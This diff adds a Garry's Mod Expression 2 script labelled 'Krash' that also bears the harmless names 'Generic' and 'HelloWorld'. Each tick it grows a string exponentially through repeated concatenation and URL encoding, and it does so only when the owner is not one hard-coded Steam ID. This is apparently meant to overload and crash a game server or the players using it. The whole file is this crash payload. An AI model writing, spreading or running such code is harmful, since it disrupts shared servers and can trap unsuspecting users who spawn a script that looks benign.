@@ -1,0 +1,11 @@
+# @name Krash XXX Jopa26 
+@name Generic
+@inputs 
+@outputs 
+@persist 
+@trigger 
+
+@name HelloWorld
+@persist I:string
+interval(1)
+if(owner():steamID() != "STEAM0:0:204894442"){ I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(()()__:{?}}}" + "+ sadddddd" I = httpUrlDecode(httpUrlEncode(I)) + I + I + I + I + "+-=-+)+(_()()__:{?}}}" + "+ sadddddd" if(ops() > 5000){reset()}}
